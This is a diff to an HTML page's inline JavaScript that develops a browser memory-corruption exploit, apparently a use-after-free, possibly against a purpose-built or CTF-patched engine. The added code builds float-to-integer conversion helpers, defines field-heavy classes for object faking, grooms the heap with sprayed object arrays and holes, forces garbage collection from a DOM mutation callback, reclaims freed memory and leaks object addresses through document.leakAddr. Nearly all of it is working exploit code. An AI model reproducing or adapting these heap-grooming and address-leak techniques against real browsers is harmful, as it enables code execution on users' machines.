@@ -1,6 +1,72 @@
 <head>
 <script>
 
+function f64_to_uint(f64)
+{
+        var bytes = new Uint8Array(new Float64Array([f64]).buffer)
+        if(bytes.length != 8)
+        {
+                if(debug) log("f64_to_uint error.")
+        }
+        var uint = 0
+        for(var i=0; i<bytes.length; i++)
+        {
+                uint += (bytes[bytes.length - i - 1] * Math.pow(2, 0x38 - i * 8))
+        }
+        return uint
+}
+
+function uint_to_f64(uint)
+{
+        var high  = (uint /  Math.pow(2, 0x20))
+        var low   = (uint &  0xFFFFFFFF)
+        var bytes = new Uint8Array((new Uint32Array([low, high]).buffer))
+        var f64_array = new Float64Array(bytes.buffer)
+        return f64_array[0]
+}
+
+class Y {
+    constructor(arr) {
+	this.aa = "a",
+	this.bb = "b",
+	this.cc = "c",
+	this.dd = "d",
+	this.ee = "e",
+	this.ff = "f",
+	this.gg = obj,
+	this.hh = "h",
+	this.ii = "i",
+	this.jj = "j",
+	this.kk = "k",
+	this.ll = "l",
+	this.mm = "m",
+	this.nn = "n",
+	this.oo = "o",
+	this.pp = "p"
+    }
+};
+
+class X {
+    constructor(arr) {
+	this.a = 16,
+	this.b = 15,
+	this.c = 14,
+	this.d = 13,
+	this.e = 12,
+	this.f = 11,
+	this.g = arr,
+	this.h = 9,
+	this.i = 8,
+	this.j = 7,
+	this.k = 6,
+	this.l = 5,
+	this.m = 4,
+	this.n = 3,
+	this.o = 2,
+	this.p = 1
+    }
+};
+
 function gc() {
     for (let i = 0; i < 0x60; i++) { new ArrayBuffer(0x1000000); }
 }
@@ -8,15 +74,21 @@ function gc() {
 var placeholder_1 = [];
 var holes = [];
 var placeholder_2 = [];
+var placeholder_3 = [];
 
-for (let i = 0; i < 7; ++i)
+for (let i = 0; i < 6; ++i)
     holes.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
 for (let i = 0; i < 239; ++i)
     placeholder_1.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
 
+placeholder_2.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
+holes.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
+for (let i = 0; i < 249; ++i)
+    placeholder_2.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
+
 holes.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
 for (let i = 0; i < 250; ++i)
-    placeholder_2.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
+    placeholder_3.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
 
 holes = undefined;
 
@@ -33,7 +105,7 @@ function start()
     worker = document.getElementById("worker");
     window.top.document.getElementById("cur").addEventListener("DOMNodeInserted", callback0);
     var intl = setInterval(function(){
-        worker.GetURL.a = 777;
+        // worker.GetURL.a = 777;
         window.top.f();
         clearInterval(intl);
     }, 1);
@@ -43,13 +115,29 @@ function callback0(ev) {
     window.requestAnimationFrame(callback);
 }
 
+var big_guys = [];
+var reclaim;
 function callback(ev) {
-    placeholder_2 = undefined;
     gc();
-    document.leakState();
-    setTimeout(function() {
-	worker.GetURL();
-    }, 1000);
+    let tmp1 = {a: 1, b: 2, c: 3, d: 4, e: 5};
+    let tmp2 = {a: tmp1, b: 2, c: 3, d: 4, e: 5};
+    document.leakAddr(tmp1);
+    placeholder_2 = undefined;
+    tmp1 = undefined;
+    tmp2 = undefined;
+    gc();
+    var intl2 = setInterval(function(){
+        for (let i = 0; i < 100; ++i) {
+            let guy = new X([i]);
+            big_guys.push(guy);
+            document.leakAddr(guy);
+        }
+        reclaim = new X();
+        document.leakAddr(reclaim);
+        document.leakAddr(worker.a);
+        alert(Symbol.prototype.toString.call(worker.a));
+        clearInterval(intl2);
+    }, 1);
 }
 
 </script>
